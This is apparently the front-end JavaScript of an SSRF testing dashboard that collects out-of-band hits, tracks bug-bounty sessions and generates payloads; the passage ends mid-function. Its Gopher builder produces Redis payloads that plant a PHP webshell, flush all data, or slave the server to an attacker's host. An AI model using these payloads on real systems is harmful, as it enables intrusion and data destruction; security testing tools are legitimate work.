'use strict';

// ── State ──────────────────────────────────────────────────────────────────
let apiKey = localStorage.getItem('ssrfbox_key') || '';
let ws = null;
let interactions = [];
let filteredInteractions = [];
let sessions = {};  // uuid → UUIDSession
let stats = { dns: 0, http: 0, smtp: 0, ldap: 0, redis: 0, mysql: 0, postgresql: 0, ftp: 0, elasticsearch: 0, memcached: 0, mongodb: 0, smb: 0 };
const DOMAIN = window.location.hostname;

// Search state
let searchMode = false;
let searchQuery = '';
let searchResults = [];
let searchDebounce = null;

// Payload export state
let currentPayloads = [];

// Timeline state
let currentTimeline = null;

const STATUS_LABELS = {
  '': '–',
  'confirmed': '✓ Confirmed',
  'investigate': '? Investigate',
  'false_positive': '✗ False Positive',
};

// ── Notification + Sound settings ─────────────────────────────────────────
let notifEnabled = localStorage.getItem('ssrfbox_notif') !== 'false';
let soundEnabled = localStorage.getItem('ssrfbox_sound') !== 'false';

function toggleNotif() {
  if (!('Notification' in window)) {
    alert('Tu navegador no soporta notificaciones de escritorio');
    return;
  }
  if (Notification.permission === 'denied') {
    alert('Las notificaciones están bloqueadas en este navegador. Actívalas en la configuración del sitio.');
    return;
  }
  if (!notifEnabled || Notification.permission !== 'granted') {
    Notification.requestPermission().then(perm => {
      notifEnabled = (perm === 'granted');
      localStorage.setItem('ssrfbox_notif', notifEnabled);
      updateNotifButton();
      if (notifEnabled) showToast('Notificaciones activadas');
    });
  } else {
    notifEnabled = false;
    localStorage.setItem('ssrfbox_notif', 'false');
    updateNotifButton();
    showToast('Notificaciones desactivadas');
  }
}

function toggleSound() {
  soundEnabled = !soundEnabled;
  localStorage.setItem('ssrfbox_sound', soundEnabled);
  updateSoundButton();
  if (soundEnabled) { playBeep(); showToast('Sonido activado'); }
  else showToast('Sonido silenciado');
}

function updateNotifButton() {
  const btn = document.getElementById('notif-btn');
  if (!btn) return;
  const active = notifEnabled && 'Notification' in window && Notification.permission === 'granted';
  btn.textContent = active ? '🔔' : '🔕';
  btn.title = active ? 'Notificaciones activas — click para desactivar' : 'Activar notificaciones de escritorio';
  btn.classList.toggle('btn-active', active);
}

function updateSoundButton() {
  const btn = document.getElementById('sound-btn');
  if (!btn) return;
  btn.textContent = soundEnabled ? '🔊' : '🔇';
  btn.title = soundEnabled ? 'Sonido activo — click para silenciar' : 'Activar sonido de alerta';
  btn.classList.toggle('btn-active', soundEnabled);
}

function sendNotification(i) {
  const session = sessions[i.uuid];
  const typeLabel = (i.type || 'hit').toUpperCase();
  const title = `SSRF-BOX: ${typeLabel}${session ? ' — ' + session.program : ''}`;
  const body = `${i.source_ip || '?'} → ${truncate(i.path || i.query_name || i.raw_data || '', 90)}`;

  if (notifEnabled && 'Notification' in window && Notification.permission === 'granted' && !document.hasFocus()) {
    try {
      const n = new Notification(title, { body, tag: 'ssrf-hit' });
      n.onclick = () => { window.focus(); n.close(); };
      setTimeout(() => n.close(), 6000);
    } catch (_) {}
  }
  if (soundEnabled) playBeep();
}

function playBeep() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = 'sine';
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.setValueAtTime(660, ctx.currentTime + 0.12);
    gain.gain.setValueAtTime(0.18, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.4);
    setTimeout(() => ctx.close(), 500);
  } catch (_) {}
}

// ── Auth ───────────────────────────────────────────────────────────────────
function login() {
  apiKey = document.getElementById('api-key-input').value.trim();
  if (!apiKey) return showAuthError('Introduce una API key');
  localStorage.setItem('ssrfbox_key', apiKey);
  bootstrap();
}

function showAuthError(msg) {
  const el = document.getElementById('auth-error');
  el.textContent = msg;
  el.classList.remove('hidden');
}

// ── Bootstrap ──────────────────────────────────────────────────────────────
async function bootstrap() {
  try {
    const resp = await apiFetch('/api/stats');
    if (resp.status === 403) { showAuthError('API key incorrecta'); return; }
    const data = await resp.json();
    document.getElementById('auth-gate').classList.add('hidden');
    document.getElementById('app').classList.remove('hidden');
    document.getElementById('selftest-btn').classList.remove('hidden');
    updateStats(data.by_type, data.total);
    await Promise.all([loadInteractions(), loadSessions()]);
    await loadAndShowHistory();
    connectWS();
    setupPayloadTypeListener();
    updateNotifButton();
    updateSoundButton();
  } catch (e) {
    showAuthError('Error conectando con el servidor: ' + e.message);
  }
}

// ── Self-test ──────────────────────────────────────────────────────────────
async function selfTest() {
  const btn = document.getElementById('selftest-btn');
  btn.disabled = true;
  btn.textContent = '⏳ Testing...';
  try {
    const resp = await apiFetch('/api/selftest', { method: 'POST' });
    const data = await resp.json();
    if (!data.ok) {
      btn.textContent = '✗ Fallo';
      showToast('Self-test falló: ' + (data.error || 'Sin respuesta en ningún puerto'));
      setTimeout(() => { btn.textContent = '⚡ Self-test'; btn.disabled = false; }, 4000);
      return;
    }
    const uuid = data.uuid;
    let attempts = 0;
    const poll = setInterval(() => {
      attempts++;
      if (interactions.some(i => i.uuid === uuid)) {
        clearInterval(poll);
        btn.textContent = '✓ OK';
        showToast(`Self-test OK — hit HTTP recibido (puerto ${data.port})`);
        setTimeout(() => { btn.textContent = '⚡ Self-test'; btn.disabled = false; }, 4000);
      } else if (attempts >= 12) {
        clearInterval(poll);
        btn.textContent = '✗ Sin hit';
        showToast('Self-test: petición enviada pero hit no llegó al feed en 6s');
        setTimeout(() => { btn.textContent = '⚡ Self-test'; btn.disabled = false; }, 4000);
      }
    }, 500);
  } catch (e) {
    btn.textContent = '✗ Error';
    showToast('Self-test error: ' + e.message);
    setTimeout(() => { btn.textContent = '⚡ Self-test'; btn.disabled = false; }, 4000);
  }
}

// ── CLI helper ─────────────────────────────────────────────────────────────
function copyCurlCheck(uuid) {
  const base = `${location.protocol}//${location.hostname}:8080`;
  const cmd = `curl -s -H "X-API-Key: ${apiKey}" "${base}/api/check/${uuid}"`;
  copyText(cmd);
}

// ── API helpers ────────────────────────────────────────────────────────────
function apiFetch(path, opts = {}) {
  opts.headers = { ...(opts.headers || {}), 'X-API-Key': apiKey };
  if (opts.body && typeof opts.body === 'object') {
    opts.headers['Content-Type'] = 'application/json';
    opts.body = JSON.stringify(opts.body);
  }
  return fetch(path, opts);
}

// ── Payload History ────────────────────────────────────────────────────────
async function loadAndShowHistory() {
  try {
    const resp = await apiFetch('/api/payload-history?limit=40');
    const data = await resp.json();
    renderHistory(data.history || []);
  } catch (_) {}
  showHistoryPanel();
}

function showHistoryPanel() {
  document.getElementById('payload-output').classList.add('hidden');
  document.getElementById('interaction-detail').classList.add('hidden');
  document.getElementById('timeline-panel').classList.add('hidden');
  document.getElementById('payload-history-panel').classList.remove('hidden');
}

function renderHistory(entries) {
  const list = document.getElementById('history-list');
  if (!entries.length) {
    list.innerHTML = '<span class="muted-hint">Sin historial — genera un payload para empezar</span>';
    return;
  }
  list.innerHTML = '';
  for (const e of entries) {
    const color = e.program ? programColor(e.program) : '#21262d';
    const when = relativeTime(new Date(e.created_at));
    const statusBadge = e.status ? `<span class="status-badge status-${e.status}">${escHtml(STATUS_LABELS[e.status] || e.status)}</span>` : '';
    const item = document.createElement('div');
    item.className = 'history-item';
    item.innerHTML = `
      <div class="history-header">
        <span class="badge-type history-type">${escHtml(e.type.toUpperCase())}</span>
        <span class="history-uuid" onclick="showTimeline('${e.uuid}')" title="Ver timeline">${escHtml(e.uuid)}</span>
        ${statusBadge}
        <span class="history-time">${when}</span>
      </div>
      ${e.program ? `<div class="history-program" style="border-left-color:${color}">${escHtml(e.program)}${e.parameter ? ' · ' + escHtml(e.parameter) : ''}</div>` : ''}
      <div class="history-actions">
        <button class="btn-secondary btn-xs" onclick="showTimeline('${e.uuid}')">⏱</button>
        <button class="btn-secondary btn-xs" onclick="replayHistory('${e.uuid}','${e.type}','${escHtml(e.domain || DOMAIN)}')">▶ Regenerar</button>
        <button class="btn-danger btn-xs" onclick="deleteHistoryEntry(${e.id})">✕</button>
      </div>
    `;
    list.appendChild(item);
  }
}

async function replayHistory(uuid, type, domain) {
  try {
    const resp = await apiFetch('/api/generate', {
      method: 'POST',
      body: { type, params: { domain: domain || DOMAIN, uuid } },
    });
    const data = await resp.json();
    if (data.error) { alert(data.error); return; }
    renderPayloads(data);
  } catch (e) {
    alert('Error: ' + e.message);
  }
}

async function deleteHistoryEntry(id) {
  await apiFetch('/api/payload-history/' + id, { method: 'DELETE' });
  loadAndShowHistory();
}

// ── Sessions ───────────────────────────────────────────────────────────────
async function loadSessions() {
  const resp = await apiFetch('/api/sessions');
  const data = await resp.json();
  sessions = {};
  for (const s of (data.sessions || [])) sessions[s.uuid] = s;
  renderSessionsList();
}

async function createSession() {
  const program   = document.getElementById('s-program').value.trim();
  const parameter = document.getElementById('s-parameter').value.trim();
  const endpoint  = document.getElementById('s-endpoint').value.trim();
  const notes     = document.getElementById('s-notes').value.trim();
  if (!program) { alert('El nombre del programa es obligatorio'); return; }

  const uuid = crypto.randomUUID().replace(/-/g, '').slice(0, 8);
  try {
    const sResp = await apiFetch('/api/sessions', {
      method: 'POST', body: { uuid, program, parameter, endpoint, notes },
    });
    const session = await sResp.json();

    const pResp = await apiFetch('/api/generate', {
      method: 'POST',
      body: { type: 'ssrf', params: { domain: DOMAIN, uuid: session.uuid } },
    });
    const payloadData = await pResp.json();

    sessions[session.uuid] = session;
    renderSessionsList();
    renderPayloads(payloadData);
    ['s-program','s-parameter','s-endpoint','s-notes'].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.value = '';
    });
    showToast(`Sesión creada: ${session.uuid} (${program})`);
  } catch (e) {
    alert('Error creando sesión: ' + e.message);
  }
}

async function deleteSession(uuid) {
  if (!confirm(`Borrar sesión ${uuid}?`)) return;
  await apiFetch('/api/sessions/' + uuid, { method: 'DELETE' });
  delete sessions[uuid];
  renderSessionsList();
  applyFilters();
}

function filterBySession(uuid) {
  document.getElementById('filter-uuid').value = uuid;
  document.getElementById('filter-program').value = '';
  if (searchMode) clearSearch();
  applyFilters();
}

function renderSessionsList() {
  const list = document.getElementById('sessions-list');
  const entries = Object.values(sessions);
  document.getElementById('sessions-count').textContent = entries.length;
  if (!entries.length) {
    list.innerHTML = '<span class="muted-hint">Sin sesiones activas</span>';
    return;
  }
  list.innerHTML = '';
  for (const s of entries) {
    const color = programColor(s.program);
    const statusBadge = s.status ? `<span class="status-badge status-${s.status}">${escHtml(STATUS_LABELS[s.status] || s.status)}</span>` : '';
    const item = document.createElement('div');
    item.className = 'session-item';
    item.innerHTML = `
      <div class="session-header">
        <span class="session-program-dot" style="background:${color}"></span>
        <span class="session-program-name" onclick="filterBySession('${s.uuid}')">${escHtml(s.program)}</span>
        ${statusBadge}
        <span class="session-uuid-tag">${escHtml(s.uuid)}</span>
      </div>
      ${s.parameter || s.endpoint ? `<div class="session-meta">${escHtml(s.parameter)}${s.parameter && s.endpoint ? ' · ' : ''}${escHtml(s.endpoint)}</div>` : ''}
      ${s.notes ? `<div class="session-notes">${escHtml(s.notes)}</div>` : ''}
      <div class="session-actions">
        <button class="btn-secondary btn-xs" onclick="showTimeline('${s.uuid}')">⏱ Timeline</button>
        <button class="btn-secondary btn-xs" onclick="filterBySession('${s.uuid}')">🔍</button>
        <button class="btn-secondary btn-xs" onclick="copyText('${s.uuid}')">📋</button>
        <button class="btn-danger btn-xs" onclick="deleteSession('${s.uuid}')">✕</button>
      </div>
    `;
    list.appendChild(item);
  }
}

const PROG_COLORS = ['#1a3a5c','#1a3a2a','#3a1a2a','#2a1a3a','#3a2a1a','#1a2a3a','#3a1a1a','#1a3a3a'];
function programColor(program) {
  if (!program) return '#21262d';
  let h = 0;
  for (let i = 0; i < program.length; i++) h = (h * 31 + program.charCodeAt(i)) & 0xffff;
  return PROG_COLORS[h % PROG_COLORS.length];
}

// ── Interactions ───────────────────────────────────────────────────────────
async function loadInteractions() {
  const resp = await apiFetch('/api/interactions?limit=500');
  const data = await resp.json();
  interactions = data.interactions || [];
  applyFilters();
}

function renderFeed() {
  const feed = document.getElementById('interactions-feed');
  feed.innerHTML = '';
  for (const i of filteredInteractions.slice(0, 300)) feed.appendChild(buildRow(i, false));
  document.getElementById('total-count').textContent = interactions.length + ' interacciones';
}

function buildRow(i, isNew) {
  const row = document.createElement('div');
  row.className = 'interaction-row' + (isNew ? ' new' : '');
  row.onclick = () => showDetail(i);

  const typeDisplay = i.type || 'http';
  const path = i.path || i.query_name || i.raw_data || '—';
  const tsMs = new Date(i.timestamp).getTime();
  const exactTime = new Date(i.timestamp).toLocaleTimeString('es', { hour12: false });
  const relTime = relativeTime(new Date(i.timestamp));
  const session = sessions[i.uuid];

  let programBadge = '';
  if (session && session.program) {
    const color = programColor(session.program);
    programBadge = `<span class="prog-badge" style="background:${color}" title="${escHtml(session.program)}">${escHtml(truncate(session.program, 12))}</span>`;
  }

  row.innerHTML = `
    <span class="badge-type ${typeDisplay}">${typeDisplay.toUpperCase()}</span>
    <span class="interaction-ip">${truncate(i.source_ip || '—', 14)}</span>
    <span class="interaction-path" title="${escHtml(path)}">${programBadge}${escHtml(truncate(path, session ? 48 : 60))}</span>
    <span class="interaction-time" data-ts="${tsMs}" title="${exactTime}">${relTime}</span>
    <button class="btn-uuid-copy" onclick="event.stopPropagation();copyText('${escHtml(i.uuid)}')" title="Copiar UUID: ${escHtml(i.uuid)}">📋</button>
    ${i.decoded_data ? `<span class="interaction-decoded">⬡ ${escHtml(truncate(i.decoded_data, 80))}</span>` : ''}
  `;
  return row;
}

function applyFilters() {
  if (searchMode) return;
  const uuid    = document.getElementById('filter-uuid').value.trim().toLowerCase();
  const type    = document.getElementById('filter-type').value;
  const program = document.getElementById('filter-program').value.trim().toLowerCase();

  filteredInteractions = interactions.filter(i => {
    if (uuid && !(i.uuid || '').toLowerCase().includes(uuid)) return false;
    if (type && i.type !== type) return false;
    if (program) {
      const s = sessions[i.uuid];
      if (!s || !s.program.toLowerCase().includes(program)) return false;
    }
    return true;
  });
  renderFeed();
}

function clearFilters() {
  document.getElementById('filter-uuid').value = '';
  document.getElementById('filter-type').value = '';
  document.getElementById('filter-program').value = '';
  applyFilters();
}

async function deleteUUID() {
  const uuid = document.getElementById('filter-uuid').value.trim();
  if (!uuid) { alert('Introduce un UUID en el filtro primero'); return; }
  if (!confirm('Borrar todas las interacciones de UUID: ' + uuid)) return;
  await apiFetch('/api/interactions/' + uuid, { method: 'DELETE' });
  interactions = interactions.filter(i => i.uuid !== uuid);
  applyFilters();
}

// ── Search ─────────────────────────────────────────────────────────────────
function onSearchInput(val) {
  clearTimeout(searchDebounce);
  if (!val.trim()) { clearSearch(); return; }
  searchDebounce = setTimeout(() => doSearch(val.trim()), 350);
}

async function doSearch(q) {
  try {
    const resp = await apiFetch(`/api/search?q=${encodeURIComponent(q)}&limit=500`);
    const data = await resp.json();
    if (data.error) return;
    searchMode = true;
    searchQuery = q;
    searchResults = data.interactions || [];
    document.getElementById('feed-title').textContent =
      `Búsqueda: "${q}" — ${searchResults.length} resultado${searchResults.length !== 1 ? 's' : ''}`;
    document.getElementById('clear-search-btn').classList.remove('hidden');
    renderSearchFeed();
  } catch (_) {}
}

function renderSearchFeed() {
  const feed = document.getElementById('interactions-feed');
  feed.innerHTML = '';
  for (const i of searchResults.slice(0, 300)) feed.appendChild(buildRow(i, false));
}

function clearSearch() {
  searchMode = false; searchQuery = ''; searchResults = [];
  document.getElementById('search-input').value = '';
  document.getElementById('feed-title').textContent = 'Interacciones en tiempo real';
  document.getElementById('clear-search-btn').classList.add('hidden');
  applyFilters();
}

// ── Detail panel ───────────────────────────────────────────────────────────
function showDetail(i) {
  document.getElementById('payload-history-panel').classList.add('hidden');
  document.getElementById('payload-output').classList.add('hidden');
  document.getElementById('timeline-panel').classList.add('hidden');
  document.getElementById('interaction-detail').classList.remove('hidden');

  const timelineBtn = document.getElementById('detail-timeline-btn');
  if (i.uuid) {
    timelineBtn.onclick = () => showTimeline(i.uuid);
    timelineBtn.classList.remove('hidden');
  } else {
    timelineBtn.classList.add('hidden');
  }

  const ctxEl = document.getElementById('session-context');
  const session = sessions[i.uuid];
  if (session && session.program) {
    const color = programColor(session.program);
    ctxEl.innerHTML = `
      <div class="session-ctx-card" style="border-left-color:${color}">
        <div class="ctx-row"><span class="ctx-label">Programa</span><span class="ctx-value">${escHtml(session.program)}</span></div>
        ${session.parameter ? `<div class="ctx-row"><span class="ctx-label">Parámetro</span><span class="ctx-value">${escHtml(session.parameter)}</span></div>` : ''}
        ${session.endpoint ? `<div class="ctx-row"><span class="ctx-label">Endpoint</span><span class="ctx-value">${escHtml(session.endpoint)}</span></div>` : ''}
        ${session.notes ? `<div class="ctx-row"><span class="ctx-label">Notas</span><span class="ctx-value ctx-notes">${escHtml(session.notes)}</span></div>` : ''}
        <div class="ctx-row"><span class="ctx-label">CLI</span><span class="ctx-value"><button class="btn-secondary btn-xs" onclick="copyCurlCheck('${escHtml(i.uuid)}')">⌨ curl /check</button></span></div>
      </div>
    `;
    ctxEl.classList.remove('hidden');
  } else {
    ctxEl.classList.add('hidden');
  }

  const content = {
    id: i.id, uuid: i.uuid, type: i.type, timestamp: i.timestamp,
    source_ip: i.source_ip, path: i.path, method: i.method,
    query_name: i.query_name, query_type: i.query_type,
    user_agent: i.user_agent, decoded_data: i.decoded_data,
    headers: tryParseJSON(i.headers), body: i.body, raw_data: i.raw_data,
  };
  document.getElementById('detail-content').innerHTML = jsonHighlight(JSON.stringify(content, null, 2));
}

function closeDetail() {
  document.getElementById('interaction-detail').classList.add('hidden');
  loadAndShowHistory();
}

// ── Stats ──────────────────────────────────────────────────────────────────
function updateStats(byType, total) {
  stats = { ...stats, ...(byType || {}) };
  for (const t of ['dns','http','smtp','ldap','redis','mysql','postgresql','ftp','elasticsearch','smb']) {
    const el = document.querySelector(`#stat-${t} .num`);
    if (el) el.textContent = stats[t] || 0;
  }
  document.getElementById('total-count').textContent = (total || interactions.length) + ' interacciones';
}

// ── WebSocket ──────────────────────────────────────────────────────────────
function connectWS() {
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  ws = new WebSocket(`${proto}://${location.host}/ws`, [apiKey]);

  ws.onopen = () => {
    document.getElementById('status-dot').className = 'dot connected';
    document.getElementById('status-text').textContent = 'Conectado';
  };
  ws.onmessage = (ev) => {
    try {
      const msg = JSON.parse(ev.data);
      if (msg.event === 'new_interaction' && msg.interaction) onNewInteraction(msg.interaction);
    } catch (_) {}
  };
  ws.onclose = () => {
    document.getElementById('status-dot').className = 'dot disconnected';
    document.getElementById('status-text').textContent = 'Reconectando...';
    setTimeout(connectWS, 3000);
  };
  ws.onerror = () => ws.close();
}

function onNewInteraction(i) {
  interactions.unshift(i);
  stats[i.type] = (stats[i.type] || 0) + 1;
  updateStats(null, interactions.length);

  // Browser notification + sound (always, regardless of search/filter state)
  sendNotification(i);

  if (searchMode) {
    if (interactionMatchesSearch(i, searchQuery)) {
      searchResults.unshift(i);
      document.getElementById('feed-title').textContent =
        `Búsqueda: "${searchQuery}" — ${searchResults.length} resultado${searchResults.length !== 1 ? 's' : ''}`;
      renderSearchFeed();
    }
    return;
  }

  applyFilters();
  const feed = document.getElementById('interactions-feed');
  if (feed.firstChild) {
    const newRow = buildRow(i, true);
    feed.insertBefore(newRow, feed.firstChild);
    if (document.getElementById('auto-scroll').checked) feed.scrollTop = 0;
  }

  // Refresh timeline if open for this UUID
  if (currentTimeline === i.uuid) showTimeline(i.uuid);
}

function interactionMatchesSearch(i, q) {
  const lower = q.toLowerCase();
  return [i.uuid, i.source_ip, i.path, i.query_name, i.user_agent, i.raw_data, i.decoded_data, i.headers, i.body]
    .some(f => f && f.toLowerCase().includes(lower));
}

// ── Payload generator ──────────────────────────────────────────────────────
function setupPayloadTypeListener() {
  document.getElementById('payload-type').addEventListener('change', function () {
    document.getElementById('rebind-extra').classList.toggle('hidden', this.value !== 'rebind');
    document.getElementById('bypass-extra').classList.toggle('hidden', this.value !== 'bypass');
  });
}

async function generatePayload() {
  const type = document.getElementById('payload-type').value;
  const params = { domain: DOMAIN };
  if (type === 'rebind') {
    params.public_ip = document.getElementById('public-ip').value || '1.1.1.1';
    params.private_ip = document.getElementById('private-ip').value || '169.254.169.254';
  }
  if (type === 'bypass') {
    params.target = document.getElementById('bypass-target').value || '127.0.0.1';
  }
  try {
    const resp = await apiFetch('/api/generate', { method: 'POST', body: { type, params } });
    const data = await resp.json();
    if (data.error) { alert(data.error); return; }
    renderPayloads(data);
    if (type === 'rebind' && data.uuid) {
      await apiFetch('/api/rebind', {
        method: 'POST',
        body: { uuid: data.uuid, public_ip: params.public_ip, private_ip: params.private_ip, switch_after: 1 },
      });
    }
  } catch (e) { alert('Error: ' + e.message); }
}

function renderPayloads(data) {
  currentPayloads = data.payloads || [];
  document.getElementById('payload-history-panel').classList.add('hidden');
  document.getElementById('interaction-detail').classList.add('hidden');
  document.getElementById('timeline-panel').classList.add('hidden');
  const output = document.getElementById('payload-output');
  const list = document.getElementById('payload-list');
  document.getElementById('payload-uuid-badge').textContent = data.uuid || '';
  output.classList.remove('hidden');
  list.innerHTML = '';

  if (data.rebind_setup) {
    const info = document.createElement('div');
    info.className = 'payload-item';
    info.innerHTML = `<div class="payload-desc"><b>Setup DNS Rebinding:</b><br>${
      Object.entries(data.rebind_setup).map(([k,v]) => `<b>${k}:</b> ${escHtml(v)}`).join('<br>')
    }</div>`;
    list.appendChild(info);
  }

  for (const p of (data.payloads || [])) {
    const item = document.createElement('div');
    item.className = 'payload-item';
    item.innerHTML = `
      <div class="payload-text" title="Click para copiar" onclick="copyText('${escHtml(p.payload)}')">${escHtml(p.payload)}</div>
      <div class="payload-desc">${escHtml(p.description)}</div>
      <div class="payload-technique">${escHtml(p.technique)}</div>
    `;
    list.appendChild(item);
  }

  // Curl snippet for CLI polling
  const curlEl = document.getElementById('payload-curl-snippet');
  if (data.uuid && curlEl) {
    const base = `${location.protocol}//${location.hostname}:8080`;
    const cmd = `curl -s -H "X-API-Key: ${apiKey}" "${base}/api/check/${data.uuid}"`;
    curlEl.innerHTML = `
      <div class="curl-label">CLI check:</div>
      <div class="curl-cmd" onclick="copyText('${escHtml(cmd)}')" title="Click para copiar">${escHtml(cmd)}</div>
      <div class="curl-hint">watch -n1 '${escHtml(cmd)}'</div>
    `;
    curlEl.classList.remove('hidden');
  } else if (curlEl) {
    curlEl.classList.add('hidden');
  }
}

// ── Timeline / correlation view ─────────────────────────────────────────────
async function showTimeline(uuid) {
  currentTimeline = uuid;
  document.getElementById('payload-history-panel').classList.add('hidden');
  document.getElementById('payload-output').classList.add('hidden');
  document.getElementById('interaction-detail').classList.add('hidden');
  const panel = document.getElementById('timeline-panel');
  panel.classList.remove('hidden');
  document.getElementById('timeline-uuid-badge').textContent = uuid;

  const session = sessions[uuid];
  renderTimelineStatusBar(uuid, session ? (session.status || '') : '');

  const content = document.getElementById('timeline-content');
  content.innerHTML = '<span class="muted-hint">Cargando…</span>';
  try {
    const resp = await apiFetch(`/api/interactions/${uuid}?limit=500`);
    const data = await resp.json();
    const items = (data.interactions || []).slice().sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
    renderTimelineContent(uuid, items);
  } catch (e) {
    content.innerHTML = '<span class="muted-hint">Error cargando interacciones</span>';
  }
}

function closeTimeline() {
  document.getElementById('timeline-panel').classList.add('hidden');
  currentTimeline = null;
  loadAndShowHistory();
}

function renderTimelineStatusBar(uuid, currentStatus) {
  const bar = document.getElementById('timeline-status-bar');
  const statuses = [
    { value: '', label: '– Sin clasificar' },
    { value: 'confirmed', label: '✓ Confirmed' },
    { value: 'investigate', label: '? Investigate' },
    { value: 'false_positive', label: '✗ False Positive' },
  ];
  bar.innerHTML = '<div class="timeline-status-btns">' +
    statuses.map(s => {
      const isActive = s.value === currentStatus;
      const cls = `btn-status${isActive ? ' btn-status-active btn-status-' + (s.value || 'none') : ''}`;
      return `<button class="${cls}" onclick="setStatus('${uuid}','${s.value}')">${escHtml(s.label)}</button>`;
    }).join('') +
  '</div>';
}

function renderTimelineContent(uuid, items) {
  const el = document.getElementById('timeline-content');
  if (!items.length) {
    el.innerHTML = '<span class="muted-hint">Sin interacciones para este UUID</span>';
    return;
  }
  const t0 = new Date(items[0].timestamp);
  el.innerHTML = '';

  for (let idx = 0; idx < items.length; idx++) {
    const i = items[idx];
    const t = new Date(i.timestamp);
    const delta = ((t - t0) / 1000).toFixed(1);

    if (idx > 0) {
      const gap = (t - new Date(items[idx - 1].timestamp)) / 1000;
      if (gap >= 5) {
        const gapEl = document.createElement('div');
        gapEl.className = 'timeline-gap';
        const gapStr = gap >= 60 ? (gap / 60).toFixed(1) + 'm' : gap.toFixed(1) + 's';
        gapEl.textContent = `── ${gapStr} gap ──`;
        el.appendChild(gapEl);
      }
    }

    const row = document.createElement('div');
    row.className = 'timeline-event';
    row.onclick = () => showDetail(i);
    const path = i.path || i.query_name || i.raw_data || '—';
    row.innerHTML = `
      <div class="timeline-delta">+${delta}s</div>
      <div class="timeline-body">
        <span class="badge-type ${i.type || 'http'}">${(i.type || '').toUpperCase()}</span>
        <span class="timeline-ip">${escHtml(i.source_ip || '—')}</span>
        <span class="timeline-path" title="${escHtml(path)}">${escHtml(truncate(path, 55))}</span>
      </div>
    `;
    el.appendChild(row);
  }
}

async function setStatus(uuid, status) {
  try {
    await apiFetch(`/api/sessions/${uuid}/status`, { method: 'PATCH', body: { status } });
    if (sessions[uuid]) {
      sessions[uuid].status = status;
    } else {
      // Create a minimal local entry so the badge renders
      sessions[uuid] = { uuid, program: '', parameter: '', endpoint: '', notes: '', status };
    }
    renderSessionsList();
    if (currentTimeline === uuid) renderTimelineStatusBar(uuid, status);
    showToast('Estado: ' + (STATUS_LABELS[status] || status || 'Sin clasificar'));
  } catch (e) {
    alert('Error: ' + e.message);
  }
}

// ── Gopher Builder ─────────────────────────────────────────────────────────
let currentGopherURL = '';

const GOPHER_DEFAULT_PORTS = { redis: '6379', http: '80', smtp: '25', custom: '' };

function gopherProtoChange() {
  const proto = document.getElementById('g-proto').value;
  const map = { redis: 'g-redis', http: 'g-http', smtp: 'g-smtp', custom: 'g-custom' };
  Object.values(map).forEach(id => document.getElementById(id).classList.add('hidden'));
  document.getElementById(map[proto] || 'g-custom').classList.remove('hidden');
  const portEl = document.getElementById('g-port');
  if (!portEl.value) portEl.value = GOPHER_DEFAULT_PORTS[proto] || '';
  if (proto === 'redis') gopherRedisChange();
  document.getElementById('g-output').classList.add('hidden');
}

function gopherRedisChange() {
  const tpl = document.getElementById('g-redis-tpl').value;
  const fields = document.getElementById('g-redis-fields');
  switch (tpl) {
    case 'flushall':
      fields.innerHTML = '';
      break;
    case 'set':
      fields.innerHTML = `
        <input type="text" id="g-r-key" placeholder="key">
        <input type="text" id="g-r-val" placeholder="value">`;
      break;
    case 'webshell':
      fields.innerHTML = `
        <input type="text" id="g-r-dir" placeholder="Dir" value="/var/www/html">
        <input type="text" id="g-r-file" placeholder="Filename" value="shell.php">
        <textarea id="g-r-shell" rows="2"><?php system($_GET['cmd']); ?></textarea>`;
      break;
    case 'slaveof':
      fields.innerHTML = `
        <input type="text" id="g-r-master" placeholder="Master IP (tu VPS)">
        <input type="text" id="g-r-mport" placeholder="Master port" value="6379">`;
      break;
    case 'custom':
      fields.innerHTML = `
        <textarea id="g-r-resp" rows="3" placeholder="RESP raw (usa \\r\\n para CRLF)"></textarea>`;
      break;
  }
}

function respCmd(...args) {
  const enc = new TextEncoder();
  return `*${args.length}\r\n` + args.map(a => {
    const len = enc.encode(a).length;
    return `$${len}\r\n${a}\r\n`;
  }).join('');
}

function buildRedisPayload() {
  const tpl = document.getElementById('g-redis-tpl').value;
  switch (tpl) {
    case 'flushall':
      return respCmd('FLUSHALL');
    case 'set': {
      const key = document.getElementById('g-r-key')?.value || 'key';
      const val = document.getElementById('g-r-val')?.value || 'value';
      return respCmd('SET', key, val);
    }
    case 'webshell': {
      const dir   = document.getElementById('g-r-dir')?.value   || '/var/www/html';
      const file  = document.getElementById('g-r-file')?.value  || 'shell.php';
      const shell = document.getElementById('g-r-shell')?.value || '<?php system($_GET["cmd"]); ?>';
      return (
        respCmd('CONFIG', 'SET', 'dir', dir) +
        respCmd('CONFIG', 'SET', 'dbfilename', file) +
        respCmd('SET', 'ssrfpayload', shell) +
        respCmd('BGSAVE')
      );
    }
    case 'slaveof': {
      const master = document.getElementById('g-r-master')?.value || '127.0.0.1';
      const mport  = document.getElementById('g-r-mport')?.value  || '6379';
      return respCmd('SLAVEOF', master, mport);
    }
    case 'custom': {
      const raw = document.getElementById('g-r-resp')?.value || '';
      return raw.replace(/\\r\\n/g, '\r\n').replace(/\\n/g, '\n');
    }
    default: return '';
  }
}

function buildHTTPPayload() {
  const method  = document.getElementById('g-http-method').value;
  const path    = document.getElementById('g-http-path').value.trim()    || '/';
  const hostHdr = document.getElementById('g-http-hosthdr').value.trim();
  const hdrs    = document.getElementById('g-http-hdrs').value.trim();
  const body    = document.getElementById('g-http-body').value;

  let req = `${method} ${path} HTTP/1.1\r\n`;
  if (hostHdr) req += `${hostHdr.startsWith('Host:') ? hostHdr : 'Host: ' + hostHdr}\r\n`;
  if (hdrs) {
    for (const line of hdrs.split('\n')) {
      if (line.trim()) req += line.trim() + '\r\n';
    }
  }
  if (body) req += `Content-Length: ${new TextEncoder().encode(body).length}\r\nContent-Type: application/x-www-form-urlencoded\r\n`;
  req += `Connection: close\r\n\r\n`;
  if (body) req += body;
  return req;
}

function buildSMTPPayload() {
  const from  = document.getElementById('g-smtp-from').value.trim()  || 'attacker@test.com';
